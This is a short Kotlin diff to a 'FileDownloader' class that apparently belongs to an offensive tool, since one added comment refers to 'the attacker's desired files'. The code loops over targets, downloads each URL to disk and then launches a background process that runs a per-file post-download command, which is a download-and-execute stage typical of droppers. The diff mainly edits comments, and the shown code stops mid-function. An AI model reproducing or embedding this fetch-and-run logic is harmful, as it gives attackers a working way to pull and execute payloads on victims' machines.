@@ -29,12 +29,14 @@ class FileDownloader(
     }
 
     suspend fun downloadFiles() = coroutineScope {
+        // Loop the attacker's desired files to download
         downloadTargets.forEach { downloadItem ->
 
             try {
                 // Create a path for the destination file
                 val targetPath = Paths.get(downloadItem.targetDirectory).resolve(downloadItem.targetFilename).toFile()
 
+                // Download the file from the URL
                 client.prepareGet(downloadItem.url).execute { httpResponse ->
                     val channel: ByteReadChannel = httpResponse.body()
                     channel.copyAndClose(targetPath.writeChannel())
@@ -45,7 +47,7 @@ class FileDownloader(
 
             logger.info("Downloaded file: ${downloadItem.targetFilename}")
 
-            // Create a background process that runs the post-download command
+            // Run a background process that executes any post-download command
             if(downloadItem.postDownloadCommand.isNotEmpty()) {
                 launch {
                     val resolvedCommand = if (System.getProperty("os.name").orEmpty().contains("Windows", ignoreCase = true)) {
